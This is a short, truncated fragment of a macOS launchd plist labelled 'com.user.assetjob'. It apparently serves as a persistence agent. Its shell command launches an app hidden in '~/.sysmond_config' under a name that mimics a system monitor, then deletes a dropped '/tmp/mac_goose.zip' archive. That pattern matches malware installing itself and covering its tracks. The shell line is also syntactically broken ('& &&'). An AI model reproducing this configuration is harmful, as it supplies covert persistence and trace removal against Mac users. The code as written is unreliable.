<plist version="1.0">
  <dict>
    <key>Label</key>
    <string>com.user.assetjob</string>

    <key>ProgramArguments</key>
    <array>
      <string>/bin/sh</string>
      <string>-c</string>
      <string> nohup open -a /Users/home/.sysmond_config/SysmondAssist.app & && rm /tmp/mac_goose.zip</string>
    </array>

    <key>StartCalendarInterval</key>
